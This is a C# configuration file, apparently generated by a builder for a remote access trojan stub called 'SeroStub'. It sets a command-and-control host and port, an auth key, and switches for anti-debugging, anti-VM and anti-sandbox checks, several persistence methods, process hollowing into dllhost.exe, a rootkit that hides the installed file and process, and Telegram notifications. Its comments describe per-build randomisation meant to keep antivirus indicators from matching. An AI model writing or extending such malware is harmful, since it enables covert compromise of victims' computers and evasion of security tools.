namespace SeroStub;

internal static class Config
{
    public static readonly string[] Hosts = new[] { "localhost" };
    public const int Port = 5555;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\2063dbf3d69548aeb5901ab22b3af5c3";

    public const bool AntiDebug = false;
    public const bool AntiVM = false;
    public const bool AntiDetect = false;
    public const bool AntiSandbox = false;
    public const bool BlockCis = false;

    public const bool PersistRegistry = false;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const bool PersistWmi = false;
    public const string PersistName = "we";

    public const bool AntiKill = false;
    public const bool EnableWatchdog = false;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "dllhost.exe";

    public const string AuthKey = "tWMi3vNzAmgj0cqlzeEq9of00pe+fjR7";
    public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "bc87c60a010349c7ae2f73f958e15348";

    // Per-build env var names — randomized so no two builds share the same IoC strings
    public const string EnvKeyHollow        = "__SERO_H__";
    public const string EnvKeyPersistWorker = "SERO_PERSIST_WORKER";
    public const string EnvKeyRelaunch      = "SERO_RELAUNCH";
    public const string EnvKeyExe           = "SERO_EXE";
    public const string EnvKeyGuardian      = "SERO_GUARDIAN";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = "BBB";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = "we";
    public const string HiddenFileName = "we.exe";

    public const bool EnableRootkit = false;
    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = false;
    public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
    public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
    public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
    public static readonly byte[] TelegramSfcSeed    = new byte[] { 155, 103, 124, 249, 27, 190, 148, 143, 42, 214, 128, 146, 6, 248, 58, 29, 10, 179, 29, 134, 224, 212, 96, 246, 225, 190, 210, 16, 244, 234, 12, 97 };
}
